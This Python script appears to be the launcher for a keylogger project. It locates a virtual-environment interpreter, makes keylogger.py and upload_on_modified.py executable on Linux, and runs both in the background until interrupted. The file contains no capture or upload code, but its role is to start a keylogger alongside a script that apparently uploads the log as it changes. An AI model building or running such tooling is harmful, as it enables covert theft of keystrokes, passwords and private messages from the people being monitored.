import subprocess
import platform
import os


# Get the directory where main.py is located
script_dir = os.path.dirname(os.path.abspath(__file__))
# Get the root directory (parent of keylogger folder)
root_dir = os.path.dirname(script_dir)

current_os = platform.system()

# Determine the python executable path in the virtual environment
if current_os == "Windows":
    python_exe = os.path.join(root_dir, ".venv", "Scripts", "python.exe")
else:
    python_exe = os.path.join(root_dir, ".venv", "bin", "python")

# Fallback to system python if venv not found (though it should be there)
if not os.path.exists(python_exe):
    print(f"Warning: Virtual environment python not found at {python_exe}. Using system python.")
    python_exe = "python3" if current_os == "Linux" else "python"

if current_os == "Linux":
    subprocess.run(["chmod", "+x", os.path.join(script_dir, "keylogger.py")])
    subprocess.run(["chmod", "+x", os.path.join(script_dir, "upload_on_modified.py")])

print(f"Starting scripts with {python_exe}...")

# Run keylogger script in the background
keylogger_proc = subprocess.Popen([python_exe, "keylogger.py"], cwd=script_dir)

# Run upload script in the background
upload_proc = subprocess.Popen([python_exe, "upload_on_modified.py"], cwd=script_dir)

print("Scripts are running. Press Ctrl+C to stop both.")

try:
    # Wait for both processes to complete (which they won't unless interrupted)
    keylogger_proc.wait()
    upload_proc.wait()
except KeyboardInterrupt:
    print("\nStopping scripts...")
    keylogger_proc.terminate()
    upload_proc.terminate()
    print("Done.")
